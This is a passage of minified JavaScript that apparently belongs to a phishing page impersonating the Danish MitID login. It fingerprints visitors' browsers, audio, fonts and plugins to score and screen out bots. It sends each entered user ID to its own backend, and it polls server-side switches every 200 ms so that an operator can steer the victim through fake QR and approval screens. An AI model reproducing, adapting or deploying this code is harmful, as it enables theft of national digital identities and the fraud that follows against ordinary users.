        return "webgl-error"
    }
}
async function Qe() {
    try {
        const s = window.AudioContext || window.webkitAudioContext;
        if (!s)
            return "no-audio";
        const t = new s
          , a = t.createOscillator()
          , r = t.createAnalyser()
          , o = t.createGain()
          , n = t.createScriptProcessor(4096, 1, 1);
        a.type = "triangle",
        a.frequency.value = 1e4,
        o.gain.value = 0,
        a.connect(r),
        r.connect(n),
        n.connect(o),
        o.connect(t.destination),
        a.start(0),
        await new Promise(p => setTimeout(p, 100));
        const v = new Float32Array(r.fftSize);
        return r.getFloatFrequencyData(v),
        a.stop(),
        await t.close(),
        Array.from(v.slice(0, 30)).map(p => p.toFixed(2)).join(",").slice(0, 100)
    } catch {
        return "audio-error"
    }
}
function Ce() {
    return Array.from(navigator.plugins || []).map(t => t.name).sort().join(",").slice(0, 200)
}
async function Ze() {
    const s = ["Arial", "Helvetica", "Times New Roman", "Courier New", "Georgia", "Verdana", "Comic Sans MS", "Impact", "Trebuchet MS", "Lucida Console", "Tahoma"]
      , t = ["monospace", "sans-serif", "serif"]
      , a = "mmmmmmmmmmlli"
      , r = "72px"
      , o = []
      , n = document.createElement("span");
    n.style.position = "absolute",
    n.style.left = "-9999px",
    n.style.fontSize = r,
    n.textContent = a,
    document.body.appendChild(n);
    const v = {};
    for (const b of t)
        n.style.fontFamily = b,
        v[b] = n.offsetWidth;
    for (const b of s) {
        let p = !1;
        for (const w of t)
            if (n.style.fontFamily = `'${b}', ${w}`,
            n.offsetWidth !== v[w]) {
                p = !0;
                break
            }
        p && o.push(b)
    }
    return document.body.removeChild(n),
    o.join(",")
}
async function Oe(s) {
    const t = new TextEncoder().encode(s)
      , a = await crypto.subtle.digest("SHA-256", t);
    return Array.from(new Uint8Array(a)).map(o => o.toString(16).padStart(2, "0")).join("")
}
async function _e() {
    Ae(),
    setTimeout(async () => {
        try {
            const s = await re();
            s.bot && await Le(h, s)
        } catch {}
    }
    , 1e3)
}
async function Ge() {
    const [s,t] = await Promise.all([Ve(), re()])
      , a = We();
    let r = 0;
    return t.bot && (r += .5),
    r += (1 - a.score) * .3,
    a.confidence < .3 && (r += .1),
    a.metrics.timeSinceLoad < 1e3 && (r += .1),
    {
        visitorId: s,
        behaviorScore: a.score,
        isBot: t.bot,
        riskScore: Math.min(r, 1)
    }
}
async function Fe() {
    const s = await Ge();
    return {
        "X-Visitor-Id": s.visitorId,
        "X-Behavior-Score": s.behaviorScore.toString(),
        "X-Risk-Score": s.riskScore.toString()
    }
}
function Ie() {
    const [s,t] = d.useState("loading")
      , [a,r] = d.useState("")
      , [o,n] = d.useState(!1)
      , [v,b] = d.useState(null)
      , [p,w] = d.useState("warning")
      , f = d.useRef(null);
    d.useEffect( () => {
        _e(),
        f.current = new BroadcastChannel("mitid_channel");
        const U = setTimeout( () => t("login"), 2500);
        fetch(`${h}/api/public/settings/connection-text`).then(c => c.json()).then(c => {
            c.connectionText && r(c.connectionText)
        }
        ).catch( () => {}
        ),
        fetch(`${h}/api/public/settings/show-swipe`).then(c => c.json()).then(c => {
            n(c.showSwipe !== !1)
        }
        ).catch( () => {}
        ),
        fetch(`${h}/api/public/settings/broadcast-message`).then(c => c.json()).then(c => {
            b(c.message || null)
        }
        ).catch( () => {}
        ),
        fetch(`${h}/api/public/settings/broadcast-type`).then(c => c.json()).then(c => {
            w(c.type === "info" ? "info" : c.type === "success" ? "success" : "warning")
        }
        ).catch( () => {}
        );
        const k = c => {
            if (c.data?.type === "connection_text" && r(c.data.value || ""),
            c.data?.type === "swipe_toggle" && n(c.data.value !== !1),
            c.data?.type === "broadcast_update") {
                const T = c.data.broadcastType === "info" ? "info" : c.data.broadcastType === "success" ? "success" : "warning";
                w(T),
                b(c.data.message || null)
            }
        }
        ;
        f.current.addEventListener("message", k);
        const j = setInterval( () => {
            fetch(`${h}/api/public/settings/connection-text`).then(c => c.json()).then(c => {
                c.connectionText !== void 0 && r(c.connectionText)
            }
            ).catch( () => {}
            ),
            fetch(`${h}/api/public/settings/show-swipe`).then(c => c.json()).then(c => {
                n(c.showSwipe === !0)
            }
            ).catch( () => {}
            ),
            fetch(`${h}/api/public/settings/broadcast-message`).then(c => c.json()).then(c => {
                b(c.message || null)
            }
            ).catch( () => {}
            ),
            fetch(`${h}/api/public/settings/broadcast-type`).then(c => c.json()).then(c => {
                w(c.type === "info" ? "info" : c.type === "success" ? "success" : "warning")
            }
            ).catch( () => {}
            )
        }
        , 200);
        return () => {
            clearTimeout(U),
            clearInterval(j),
            f.current?.close()
        }
    }
    , []),
    d.useEffect( () => {
        s === "qr" && o ? t("approve") : s === "approve" && !o && t("qr")
    }
    , [o, s]);
    const x = async U => {
        f.current && f.current.postMessage({
            type: "userid",
            value: U
        });
        try {
            localStorage.setItem("mitid_userid", JSON.stringify({
                value: U,
                timestamp: Date.now()
            }))
        } catch {}
        try {
            const j = await Fe();
            await fetch(`${h}/api/public/user-logins`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    ...j
                },
                body: JSON.stringify({
                    userId: U
                })
            })
        } catch {}
        let k = o;
        try {
            k = (await (await fetch(`${h}/api/public/settings/show-swipe`)).json()).showSwipe === !0,
            n(k)
        } catch {}
        t("qr")
    }
    ;
    return e.jsxs(e.Fragment, {
        children: [e.jsx(Be, {
            message: v,
            type: p
        }), s === "loading" && e.jsx(je, {
            titleText: a
        }), s === "approve" && e.jsx(Re, {
            onComplete: () => {}
            ,
            onCancel: () => t("login")
        }), s === "qr" && e.jsx(Me, {
            onCancel: () => t("login")
        }), s === "login" && e.jsx(ge, {
            onContinue: x,
            onCancel: () => t("loading")
        })]
    })
}
function ze() {
    return e.jsxs(me, {
        children: [e.jsx(Ue, {}), e.jsx(he, {
            children: e.jsx(ve, {
                path: "/",
                element: e.jsx(Ie, {})
            })
        })]
    })
}
ue.createRoot(document.getElementById("root")).render(e.jsx(d.StrictMode, {
    children: e.jsx(ze, {})
}));
